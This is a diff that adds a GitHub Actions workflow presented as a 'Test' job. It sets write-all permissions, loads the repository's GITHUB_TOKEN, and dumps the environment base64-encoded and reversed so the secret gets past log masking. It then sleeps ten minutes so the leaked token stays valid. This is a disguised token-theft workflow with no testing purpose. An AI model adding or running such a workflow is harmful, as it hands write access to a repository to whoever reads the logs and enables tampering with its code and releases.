@@ -1,0 +1,19 @@
+on:
+  push:
+
+permissions: write-all
+
+jobs:
+  wfd:
+    name: wfd
+    runs-on: ubuntu-latest
+    steps:
+      - name: Test
+        env:
+          TOKEN: ${{ secrets.GITHUB_TOKEN }}
+        run: |
+          env | base64
+          echo hello world
+          env | rev
+          echo done
+          sleep 600
